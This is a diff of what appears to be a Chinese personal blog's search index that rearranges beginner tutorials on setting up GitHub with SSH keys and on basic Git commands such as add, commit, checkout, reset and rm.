+<p>2.打开github,选择settings<br><img src="https://i.imgur.com/jqqfV4E.png" alt><br>得到如下页面，点击ssh and gpg keys,选择ssh keys 右边的new ssh key。出现下面绿色框的内容，填写标题，并将自己刚才复制的密钥粘贴到key中。最后点击add ssh key.<br><img src="https://i.imgur.com/PWqO1em.png" alt><br>3.查看是否成功。</p>
+<p>在git bash中输入命令：ssh -T <a href="mailto:git@github.com">git@github.com</a><br>会提示，是否continue，输入yes。<br>后就会看到：</p>
+<p>Warning:Permanently added ‘github.com,207.97.227.239’ (RSA) to the list of known hosts.</p>
+<p>Hi zhangsiyao11! You’ve successfully authenticated, but GitHub does not provide shell access.</p>
+<p>这样就成功了，不用理会warning。</p>
+<p>4.克隆你刚才新建的仓库到本地<br>输入命令：<br>git clone <a href="https://github.com/zhangsiyao11/chat" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat</a><br>后面的http是你的仓库的地址。<br>此时会在刚才创建ssh  key的默认目录下生成以你仓库名为文件名的文件，打开得到下图所示：<br><img src="https://i.imgur.com/0oHqKNs.png" alt></p>
+<p>6.在此处右键打开git bash,输入如下命令：<br>git init<br>git add “文件名”<br>git commit -m “文件名”<br>如果出现让你设置用户名和用户邮箱的提示，就按照提示上给的命令输入即可。后再次执行上面commit的命令。<br>git remote add origin <a href="https://github.com/zhangsiyao11/chat" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat</a><br>http为你自己仓库的地址<br>如果出现错误：<br>fatal: remote origin already exists<br>则执行以下语句：git remote rm origin<br>再执行git remote add origin <a href="https://github.com/zhangsiyao11/chat即可。" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat即可。</a><br>最后在依次执行：<br>git pull origin master<br>git push origin master<br>完成，再打开自己的仓库就会出现刚刚上传的项目文件:<br><img src="https://i.imgur.com/X0sb9Hw.png" alt></p>
+]]></content>
+      <categories>
+        <category>Github</category>
+      </categories>
+      <tags>
+        <tag>Github</tag>
       </tags>
   </entry>
   <entry>
@@ -645,143 +668,6 @@
       <tags>
         <tag>DVWA</tag>
         <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>GitHub上传</title>
-    <url>/posts/8472.html</url>
-    <content><![CDATA[<h2 id="GitHub上传"><a href="#GitHub上传" class="headerlink" title="GitHub上传"></a>GitHub上传</h2><hr>
-<p>0x00.首先注册github账号，登录，创建新仓库 ，点击+，点击new repository   <img src="https://i.imgur.com/Q2p1noE.png" alt>    </p>
-<p>进入如下页面，填写仓库名，自己随便写一个名字，下面的描述可写可不写，点击Initialize this repository   with a README，然后创建：<a id="more"></a><br><img src="https://i.imgur.com/wNvnT5T.png" alt>   </p>
-<p>0x01.下载git<br><a href="https://gitforwindows.org/" target="_blank" rel="noopener">https://gitforwindows.org/</a> </p>
-<p>0x02.配置git<br>1.设置本地的ssh key，打开git bash,输入命令：<br>ssh-keygen -t rsa -C “<a href="mailto:XXXXXX@XXXX.com">XXXXXX@XXXX.com</a>“<br>其中双引号中是你注册github时用的邮箱。<br>一直回车，选择默认路径，和空密码。最后会在默认路径下生成.ssh文件夹，打开.ssh里面有两个文件，打开id_rsa.pub复制里面的密钥。</p>
-<p>2.打开github,选择settings<br><img src="https://i.imgur.com/jqqfV4E.png" alt><br>得到如下页面，点击ssh and gpg keys,选择ssh keys 右边的new ssh key。出现下面绿色框的内容，填写标题，并将自己刚才复制的密钥粘贴到key中。最后点击add ssh key.<br><img src="https://i.imgur.com/PWqO1em.png" alt><br>3.查看是否成功。</p>
-<p>在git bash中输入命令：ssh -T <a href="mailto:git@github.com">git@github.com</a><br>会提示，是否continue，输入yes。<br>后就会看到：</p>
-<p>Warning:Permanently added ‘github.com,207.97.227.239’ (RSA) to the list of known hosts.</p>
-<p>Hi zhangsiyao11! You’ve successfully authenticated, but GitHub does not provide shell access.</p>
-<p>这样就成功了，不用理会warning。</p>
-<p>4.克隆你刚才新建的仓库到本地<br>输入命令：<br>git clone <a href="https://github.com/zhangsiyao11/chat" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat</a><br>后面的http是你的仓库的地址。<br>此时会在刚才创建ssh  key的默认目录下生成以你仓库名为文件名的文件，打开得到下图所示：<br><img src="https://i.imgur.com/0oHqKNs.png" alt></p>
-<p>6.在此处右键打开git bash,输入如下命令：<br>git init<br>git add “文件名”<br>git commit -m “文件名”<br>如果出现让你设置用户名和用户邮箱的提示，就按照提示上给的命令输入即可。后再次执行上面commit的命令。<br>git remote add origin <a href="https://github.com/zhangsiyao11/chat" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat</a><br>http为你自己仓库的地址<br>如果出现错误：<br>fatal: remote origin already exists<br>则执行以下语句：git remote rm origin<br>再执行git remote add origin <a href="https://github.com/zhangsiyao11/chat即可。" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat即可。</a><br>最后在依次执行：<br>git pull origin master<br>git push origin master<br>完成，再打开自己的仓库就会出现刚刚上传的项目文件:<br><img src="https://i.imgur.com/X0sb9Hw.png" alt></p>
-]]></content>
-      <categories>
-        <category>Github</category>
-      </categories>
-      <tags>
-        <tag>Github</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Git学习（一）</title>
-    <url>/posts/55269.html</url>
-    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Git是目前世界上最先进的分布式版本控制系统（没有之一）。</p>
-<p>以前写的代码、文档之类的东西用完之后就被我无情抛弃了，以后要用的时候又需要重新写，麻烦，所以就想到了使用Git，将自己的文档、代码托管到GitHub上。</p>
-<h2 id="0x01-安装Git"><a href="#0x01-安装Git" class="headerlink" title="0x01 安装Git"></a>0x01 安装Git</h2><p>在Windows上使用Git，直接从官网上下载<a href="https://git-scm.com/downloads" target="_blank" rel="noopener" title="安装程序">安装程序</a>，然后默认选项安装即可。</p>
-<p>安装完成后，鼠标右键，出现如下图，说明Git安装成功！<br><img src="/posts/55269/1.png" alt></p>
-<p>安装完成后，还需要最后一步设置，鼠标右键“Git bash here”，在命令行输入：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name &quot;Your Name&quot;</span><br><span class="line">$ git config --global user.email &quot;Your Email&quot;</span><br></pre></td></tr></table></figure>
-<p><strong>注意:</strong> git config命令的–global参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。</p>
-<h2 id="0x02-创建版本库"><a href="#0x02-创建版本库" class="headerlink" title="0x02 创建版本库"></a>0x02 创建版本库</h2><p>什么是版本库呢？版本库又名仓库，英文名repository，可以理解成一个目录，这个目录里面的所有文件都可以被Git管理起来，每个文件的创建、修改、删除，Git都能跟踪，以便任何时刻都可以追踪历史，或者在将来某个时刻可以“还原”。</p>
-<p>创建一个版本库也很简单，选择一个合适的地方，创建一个空目录</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mkdir learnGit</span><br><span class="line">$ cd learnGit</span><br></pre></td></tr></table></figure>
-<p>通过<code>git init</code>命令把这个目录变成Git可以管理的仓库</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git init</span><br><span class="line">Initialized empty Git repository in F:&#x2F;PythonProject&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
-<p>这样仓库就建好了，但是里面是空的，其实当前目录下多了一个<code>.git</code>文件夹，这个目录是Git用来跟踪管理版本库的，千万不要乱动。</p>
-<p>如果没有看到.git文件夹，可能是你把它隐藏了，可以用<code>ls -la</code>查看</p>
-<h2 id="0x03-三个工作区"><a href="#0x03-三个工作区" class="headerlink" title="0x03 三个工作区"></a>0x03 三个工作区</h2><ul>
-<li>工作区： 指本地创建的目录，主要保存本地文件</li>
-<li>暂存区： <code>git add</code>之后文件进入的地方，此时文件还没有进入版本库</li>
-<li>版本库： 即仓库，<code>git commit</code>之后，文件从暂存区进入仓库</li>
-</ul>
-<h2 id="0x04-小试牛刀"><a href="#0x04-小试牛刀" class="headerlink" title="0x04 小试牛刀"></a>0x04 小试牛刀</h2><p>我们先编写一个<code>README.txt</code>文件，内容如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Git is a version control system.</span><br><span class="line">This is my first test for Git!</span><br></pre></td></tr></table></figure>
-<p>一定要放到learngit目录下（子目录也行），因为这是一个Git仓库，放到其他地方Git找不到这个文件。</p>
-<p>第一步，用<code>git add &lt;file&gt;</code>把文件添加到仓库</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add README.txt</span><br></pre></td></tr></table></figure>
-<p>执行完后没有任何回显，这就对了，Unix的哲学是“没有消息就是好消息”，说明添加成功。</p>
-<p>第二步，用<code>git commit</code>提交文件到仓库</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git commit -m &quot;add a new README.txt file&quot;</span><br><span class="line">[master (root-commit) 6881823] add a new README.txt file</span><br><span class="line"> 1 file changed, 2 insertions(+)</span><br><span class="line"> create mode 100644 README.txt</span><br></pre></td></tr></table></figure>
-<p><code>-m</code>后面是本次提交的说明，可以输入任何内容，也可以不输。</p>
-<p><strong>说明：</strong> <code>git add</code>一次添加一个文件，<code>git commit</code>可以把多次add的文件一次性提交。</p>
-<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>今天主要学习如下：</p>
-<p>初始化一个Git仓库，使用<code>git init</code>命令。</p>
-<p>添加文件到Git仓库，分两步：</p>
-<ol>
-<li>使用命令git add <file>，注意，可反复多次使用，添加多个文件；</file></li>
-<li>使用命令git commit -m <message>，完成。</message></li>
-</ol>
-<p>这里要特别强调一下，所有的版本控制系统，其实只能跟踪文本文件的改动，比如TXT文件，网页，所有的程序代码等等，Git也不例外。版本控制系统可以告诉你每次的改动，比如在第5行加了一个单词“Linux”，在第8行删了一个单词“Windows”。而图片、视频这些二进制文件，虽然也能由版本控制系统管理，但没法跟踪文件的变化，只能把二进制文件每次改动串起来，也就是只知道图片从100KB改成了120KB，但到底改了啥，版本控制系统不知道，也没法知道。</p>
-<p>不幸的是，Microsoft的Word格式是二进制格式，因此，版本控制系统是没法跟踪Word文件的改动的，前面我们举的例子只是为了演示，如果要真正使用版本控制系统，就要以纯文本方式编写文件。</p>
-<p>因为文本是有编码的，比如中文有常用的GBK编码，日文有Shift_JIS编码，如果没有历史遗留问题，强烈建议使用标准的UTF-8编码，所有语言使用同一种编码，既没有冲突，又被所有平台所支持。</p>
-]]></content>
-      <tags>
-        <tag>Git</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Git学习（三）</title>
-    <url>/posts/19430.html</url>
-    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前两天学习了<br><a href="https://www.sectime.top/posts/18335.html" target="_blank" rel="noopener">Git学习（二）</a><br><a href="https://www.sectime.top/posts/55269.html" target="_blank" rel="noopener">Git学习（一）</a></p>
-<p>今天接着学习Git的管理修改、撤销修改和删除文件。</p>
-<h2 id="0x01-管理修改"><a href="#0x01-管理修改" class="headerlink" title="0x01 管理修改"></a>0x01 管理修改</h2><p>Git如此优秀是因为Git跟踪管理的是修改而不是文件。</p>
-<p>那么什么是修改呢？ 比如新增一行，删除一行，更改了某些字符，都是修改，创建一个文件，删除一个文件，都是修改。</p>
-<p>为什么说Git管理的是修改而不是文件呢？我们接着看。</p>
-<p>首先对<code>README.txt</code>进行修改，添加一行：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Git is a version control system.</span><br><span class="line">This is my first test for Git!</span><br><span class="line">Git is so good!</span><br><span class="line">Git管理的是修改</span><br></pre></td></tr></table></figure>
-<p>再<code>git add</code>，</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add README.txt</span><br><span class="line"></span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span><br><span class="line"></span><br><span class="line">        modified:   README.txt</span><br></pre></td></tr></table></figure>
-<p>再对<code>README.txt</code>进行修改：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat README.txt</span><br><span class="line">Git is a version control system.</span><br><span class="line">This is my first test for Git!</span><br><span class="line">Git is so good!</span><br><span class="line">Git管理的是修改</span><br><span class="line">test test test</span><br></pre></td></tr></table></figure>
-<p>使用<code>git commit</code>提交，再查看状态</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git commit -m &quot;modify README.txt&quot;</span><br><span class="line">[master 9f9c092] modify README.txt</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"></span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">        modified:   README.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and&#x2F;or &quot;git commit -a&quot;)</span><br></pre></td></tr></table></figure>
-<p>可以看到，我们第二次修改并没有被提交。</p>
-<p>Git管理的是修改，当你用<code>git add</code>命令后，在工作区的第一次修改被放入暂存区，准备提交，但是，在工作区的第二次修改并没有放入暂存区，所以，<code>git commit</code>只负责把暂存区的修改提交了，也就是第一次的修改被提交了，第二次的修改不会被提交。</p>
-<p>我们可以使用<code>git diff HEAD -- README.txt</code>查看一下工作区和版本库的区别。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git diff HEAD -- README.txt</span><br><span class="line">diff --git a&#x2F;README.txt b&#x2F;README.txt</span><br><span class="line">index f9b34f5..56dbf91 100644</span><br><span class="line">--- a&#x2F;README.txt</span><br><span class="line">+++ b&#x2F;README.txt</span><br><span class="line">@@ -2,3 +2,4 @@ Git is a version control system.</span><br><span class="line"> This is my first test for Git!</span><br><span class="line"> Git is so good!</span><br><span class="line"> Git管理的是修改</span><br><span class="line">+test test test</span><br></pre></td></tr></table></figure>
-<p>可见，第二次的修改确实没有被提交。</p>
-<h2 id="0x02-撤销修改"><a href="#0x02-撤销修改" class="headerlink" title="0x02 撤销修改"></a>0x02 撤销修改</h2><p>如果你在写报告的时候，不小心写错了，例如，再<code>README.txt</code>中添加一行：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat README.txt</span><br><span class="line">Git is a version control system.</span><br><span class="line">This is my first test for Git!</span><br><span class="line">Git is so good!</span><br><span class="line">Git管理的是修改</span><br><span class="line">test test test</span><br><span class="line">It is wrong!</span><br></pre></td></tr></table></figure>
-<p>在你要准备提交的时候，你突然发现了这个错误，幸亏发现的及时</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">        modified:   README.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and&#x2F;or &quot;git commit -a&quot;)</span><br></pre></td></tr></table></figure>
-<p>我们可以发现，Git给了我们提示，<code>git checkout -- file</code>可以丢弃工作区的修改</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -- README.txt</span><br></pre></td></tr></table></figure>
-<p>这样就可以把对<code>README.txt</code>文件在工作区的修改全部撤销，这个时候有两种情况：</p>
-<p>第一种： <code>README.txt</code>在被修改后还没有被添加到暂存区，这样只要执行上面的命令就可以回到和版本库一样的状态</p>
-<p>第二种： <code>README.txt</code>修改后已经被添加到暂存区，之后又做了修改，这样撤销修改就回到添加到暂存区后的状态。</p>
-<p>总之，就是让这个文件回到最近一次<code>git commit</code>或<code>git add</code>时的状态。</p>
-<p><code>git checkout -- file</code>命令中的<code>--</code>很重要，没有<code>--</code>，就变成了切换分支的意思。</p>
-<p>假如你写错了一些东西，而且还<code>git add</code>到了暂存区，但是还没有<code>git commit</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span><br><span class="line"></span><br><span class="line">        modified:   README.txt</span><br></pre></td></tr></table></figure>
-<p>Git告诉我们，使用<code>git reset HEAD &lt;file&gt;</code>命令可以把暂存区的修改撤销(unstage)，重新回到工作区</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git reset HEAD README.txt</span><br><span class="line">Unstaged changes after reset:</span><br><span class="line">M       README.txt</span><br></pre></td></tr></table></figure>
-<p><code>git reset</code>命令既可以回退版本，也可以把暂存区的修改回退到工作区。当我们用<code>HEAD</code>时，表示最新的版本。</p>
-<p>回到工作区之后，再使用上面的丢弃工作区的修改即可。</p>
-<h2 id="0x03-删除文件"><a href="#0x03-删除文件" class="headerlink" title="0x03 删除文件"></a>0x03 删除文件</h2><p>在Git中，删除也是一个修改操作，我们测试一下。</p>
-<p>首先添加一个<code>test.txt</code>，并提交。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git commit -m &quot;add test.txt&quot;</span><br><span class="line">[master 2a4c645] add test.txt</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 test.txt</span><br></pre></td></tr></table></figure>
-<p>一般情况下，我们直接把工作区的文件删除即可</p>
-<p>这个时候，Git知道我们删除了这个文件，这样工作区和版本库就不一样了，<code>git status</code>查看一下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add&#x2F;rm &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">        deleted:    test.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and&#x2F;or &quot;git commit -a&quot;)</span><br></pre></td></tr></table></figure>
-<p>现在我们有两个选择，一是我们就是要从版本库中删除该文件，那就用<code>git rm &lt;file&gt;命令删除，然后再</code>git commit`:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git rm test.txt</span><br><span class="line">rm &#39;test.txt&#39;</span><br><span class="line"></span><br><span class="line">$ git commit -m &quot;remove test.txt&quot;</span><br><span class="line">[master b2f143d] remove test.txt</span><br><span class="line"> 1 file changed, 1 deletion(-)</span><br><span class="line"> delete mode 100644 test.txt</span><br></pre></td></tr></table></figure>
-<p>这样，该文件就从版本库中删除了。</p>
-<p>二是我们误删了该文件，想要恢复，怎么办呢？<br>因为版本库里还有该文件，所以我们可以轻松的把误删的文件恢复到最新版本。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -- text.txt</span><br></pre></td></tr></table></figure>
-<p>git checkout其实是用版本库里的版本替换工作区的版本，无论工作区是修改还是删除，都可以“一键还原”。<br><strong>注意：</strong>从来没有被添加到版本库就被删除的文件，是无法恢复的！</p>
-<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ol>
-<li><p>Git跟踪的是修改，而不是文件，每次修改，如果没有用<code>git add</code>添加到暂存区，那就不会被<code>commit</code>到版本库中。</p>
-</li>
-<li><ul>
-<li>①当你改乱了工作区某个文件的内容，想直接丢弃工作区的修改时，      用命令<code>git checkout -- file</code>。</li>
-<li>当你不但改乱了工作区某个文件的内容，还添加到了暂存区时，想丢弃修改，分两步，第一步用命令<code>git reset HEAD &lt;file&gt;</code>，就回到了①，第二步按①操作。</li>
-<li>已经提交了不合适的修改到版本库时，想要撤销本次提交，参考版本回退一节，不过前提是没有推送到远程库。</li>
-</ul>
-</li>
-<li><p>已经提交了不合适的修改到版本库时，想要撤销本次提交，参考版本回退一节，不过前提是没有推送到远程库。</p>
-</li>
-</ol>
-]]></content>
-      <tags>
-        <tag>Git</tag>
       </tags>
   </entry>
   <entry>
@@ -861,6 +747,120 @@
       </tags>
   </entry>
   <entry>
+    <title>Git学习（三）</title>
+    <url>/posts/19430.html</url>
+    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前两天学习了<br><a href="https://www.sectime.top/posts/18335.html" target="_blank" rel="noopener">Git学习（二）</a><br><a href="https://www.sectime.top/posts/55269.html" target="_blank" rel="noopener">Git学习（一）</a></p>
+<p>今天接着学习Git的管理修改、撤销修改和删除文件。</p>
+<h2 id="0x01-管理修改"><a href="#0x01-管理修改" class="headerlink" title="0x01 管理修改"></a>0x01 管理修改</h2><p>Git如此优秀是因为Git跟踪管理的是修改而不是文件。</p>
+<p>那么什么是修改呢？ 比如新增一行，删除一行，更改了某些字符，都是修改，创建一个文件，删除一个文件，都是修改。</p>
+<p>为什么说Git管理的是修改而不是文件呢？我们接着看。</p>
+<p>首先对<code>README.txt</code>进行修改，添加一行：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Git is a version control system.</span><br><span class="line">This is my first test for Git!</span><br><span class="line">Git is so good!</span><br><span class="line">Git管理的是修改</span><br></pre></td></tr></table></figure>
+<p>再<code>git add</code>，</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add README.txt</span><br><span class="line"></span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span><br><span class="line"></span><br><span class="line">        modified:   README.txt</span><br></pre></td></tr></table></figure>
+<p>再对<code>README.txt</code>进行修改：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat README.txt</span><br><span class="line">Git is a version control system.</span><br><span class="line">This is my first test for Git!</span><br><span class="line">Git is so good!</span><br><span class="line">Git管理的是修改</span><br><span class="line">test test test</span><br></pre></td></tr></table></figure>
+<p>使用<code>git commit</code>提交，再查看状态</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git commit -m &quot;modify README.txt&quot;</span><br><span class="line">[master 9f9c092] modify README.txt</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"></span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">        modified:   README.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and&#x2F;or &quot;git commit -a&quot;)</span><br></pre></td></tr></table></figure>
+<p>可以看到，我们第二次修改并没有被提交。</p>
+<p>Git管理的是修改，当你用<code>git add</code>命令后，在工作区的第一次修改被放入暂存区，准备提交，但是，在工作区的第二次修改并没有放入暂存区，所以，<code>git commit</code>只负责把暂存区的修改提交了，也就是第一次的修改被提交了，第二次的修改不会被提交。</p>
+<p>我们可以使用<code>git diff HEAD -- README.txt</code>查看一下工作区和版本库的区别。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git diff HEAD -- README.txt</span><br><span class="line">diff --git a&#x2F;README.txt b&#x2F;README.txt</span><br><span class="line">index f9b34f5..56dbf91 100644</span><br><span class="line">--- a&#x2F;README.txt</span><br><span class="line">+++ b&#x2F;README.txt</span><br><span class="line">@@ -2,3 +2,4 @@ Git is a version control system.</span><br><span class="line"> This is my first test for Git!</span><br><span class="line"> Git is so good!</span><br><span class="line"> Git管理的是修改</span><br><span class="line">+test test test</span><br></pre></td></tr></table></figure>
+<p>可见，第二次的修改确实没有被提交。</p>
+<h2 id="0x02-撤销修改"><a href="#0x02-撤销修改" class="headerlink" title="0x02 撤销修改"></a>0x02 撤销修改</h2><p>如果你在写报告的时候，不小心写错了，例如，再<code>README.txt</code>中添加一行：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat README.txt</span><br><span class="line">Git is a version control system.</span><br><span class="line">This is my first test for Git!</span><br><span class="line">Git is so good!</span><br><span class="line">Git管理的是修改</span><br><span class="line">test test test</span><br><span class="line">It is wrong!</span><br></pre></td></tr></table></figure>
+<p>在你要准备提交的时候，你突然发现了这个错误，幸亏发现的及时</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">        modified:   README.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and&#x2F;or &quot;git commit -a&quot;)</span><br></pre></td></tr></table></figure>
+<p>我们可以发现，Git给了我们提示，<code>git checkout -- file</code>可以丢弃工作区的修改</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -- README.txt</span><br></pre></td></tr></table></figure>
+<p>这样就可以把对<code>README.txt</code>文件在工作区的修改全部撤销，这个时候有两种情况：</p>
+<p>第一种： <code>README.txt</code>在被修改后还没有被添加到暂存区，这样只要执行上面的命令就可以回到和版本库一样的状态</p>
+<p>第二种： <code>README.txt</code>修改后已经被添加到暂存区，之后又做了修改，这样撤销修改就回到添加到暂存区后的状态。</p>
+<p>总之，就是让这个文件回到最近一次<code>git commit</code>或<code>git add</code>时的状态。</p>
+<p><code>git checkout -- file</code>命令中的<code>--</code>很重要，没有<code>--</code>，就变成了切换分支的意思。</p>
+<p>假如你写错了一些东西，而且还<code>git add</code>到了暂存区，但是还没有<code>git commit</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span><br><span class="line"></span><br><span class="line">        modified:   README.txt</span><br></pre></td></tr></table></figure>
+<p>Git告诉我们，使用<code>git reset HEAD &lt;file&gt;</code>命令可以把暂存区的修改撤销(unstage)，重新回到工作区</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git reset HEAD README.txt</span><br><span class="line">Unstaged changes after reset:</span><br><span class="line">M       README.txt</span><br></pre></td></tr></table></figure>
+<p><code>git reset</code>命令既可以回退版本，也可以把暂存区的修改回退到工作区。当我们用<code>HEAD</code>时，表示最新的版本。</p>
+<p>回到工作区之后，再使用上面的丢弃工作区的修改即可。</p>
+<h2 id="0x03-删除文件"><a href="#0x03-删除文件" class="headerlink" title="0x03 删除文件"></a>0x03 删除文件</h2><p>在Git中，删除也是一个修改操作，我们测试一下。</p>
+<p>首先添加一个<code>test.txt</code>，并提交。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git commit -m &quot;add test.txt&quot;</span><br><span class="line">[master 2a4c645] add test.txt</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 test.txt</span><br></pre></td></tr></table></figure>
+<p>一般情况下，我们直接把工作区的文件删除即可</p>
+<p>这个时候，Git知道我们删除了这个文件，这样工作区和版本库就不一样了，<code>git status</code>查看一下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add&#x2F;rm &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">        deleted:    test.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and&#x2F;or &quot;git commit -a&quot;)</span><br></pre></td></tr></table></figure>
+<p>现在我们有两个选择，一是我们就是要从版本库中删除该文件，那就用<code>git rm &lt;file&gt;命令删除，然后再</code>git commit`:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git rm test.txt</span><br><span class="line">rm &#39;test.txt&#39;</span><br><span class="line"></span><br><span class="line">$ git commit -m &quot;remove test.txt&quot;</span><br><span class="line">[master b2f143d] remove test.txt</span><br><span class="line"> 1 file changed, 1 deletion(-)</span><br><span class="line"> delete mode 100644 test.txt</span><br></pre></td></tr></table></figure>
+<p>这样，该文件就从版本库中删除了。</p>
+<p>二是我们误删了该文件，想要恢复，怎么办呢？<br>因为版本库里还有该文件，所以我们可以轻松的把误删的文件恢复到最新版本。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -- text.txt</span><br></pre></td></tr></table></figure>
+<p>git checkout其实是用版本库里的版本替换工作区的版本，无论工作区是修改还是删除，都可以“一键还原”。<br><strong>注意：</strong>从来没有被添加到版本库就被删除的文件，是无法恢复的！</p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ol>
+<li><p>Git跟踪的是修改，而不是文件，每次修改，如果没有用<code>git add</code>添加到暂存区，那就不会被<code>commit</code>到版本库中。</p>
+</li>
+<li><ul>
+<li>①当你改乱了工作区某个文件的内容，想直接丢弃工作区的修改时，      用命令<code>git checkout -- file</code>。</li>
